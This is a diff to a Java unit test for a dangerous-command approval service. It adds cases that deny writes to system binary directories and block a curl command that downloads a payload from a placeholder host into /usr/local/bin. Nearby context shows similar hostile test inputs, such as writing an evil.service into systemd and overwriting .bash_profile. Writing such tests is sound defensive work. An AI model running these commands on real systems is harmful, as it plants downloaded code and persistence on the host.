@@ -3797,6 +3797,10 @@ public class DangerousCommandApprovalServiceTest {
         assertWriteDenied(securityPolicyService, "/etc/sudoers.d/custom");
         assertWriteDenied(securityPolicyService, "/etc/systemd/system/evil.service");
         assertWriteDenied(securityPolicyService, "/boot/grub/grub.cfg");
+        assertWriteDenied(securityPolicyService, "/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/local/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/local/sbin/payload");
         assertWriteDenied(securityPolicyService, "/usr/lib/systemd/system/evil.service");
         assertWriteDenied(securityPolicyService, "/private/etc/hosts");
         assertWriteDenied(securityPolicyService, "/private/var/root-owned");
@@ -4336,6 +4340,12 @@ public class DangerousCommandApprovalServiceTest {
                         "Set-Content $env:HOME/.bash_profile bad");
         SecurityPolicyService.FileVerdict systemd =
                 securityPolicyService.checkCommandPaths("cat service > /etc/systemd/system/evil.service");
+        SecurityPolicyService.FileVerdict localBin =
+                securityPolicyService.checkCommandPaths(
+                        "curl https://example.invalid/payload -o /usr/local/bin/payload");
+        SecurityPolicyService.FileVerdict localDownload =
+                securityPolicyService.checkCommandPaths(
+                        "curl https://example.invalid/payload -o payload");
 
         assertThat(shadow.isAllowed()).isFalse();
         assertThat(shadow.getMessage()).contains("系统文件");
@@ -4343,6 +4353,9 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(envHomeProfile.isAllowed()).isFalse();
         assertThat(envHomeProfile.getPath()).isEqualTo("$env:HOME/.bash_profile");
         assertThat(systemd.isAllowed()).isFalse();
+        assertThat(localBin.isAllowed()).isFalse();
+        assertThat(localBin.getPath()).isEqualTo("/usr/local/bin/payload");
+        assertThat(localDownload.isAllowed()).isTrue();
     }
 
     @Test
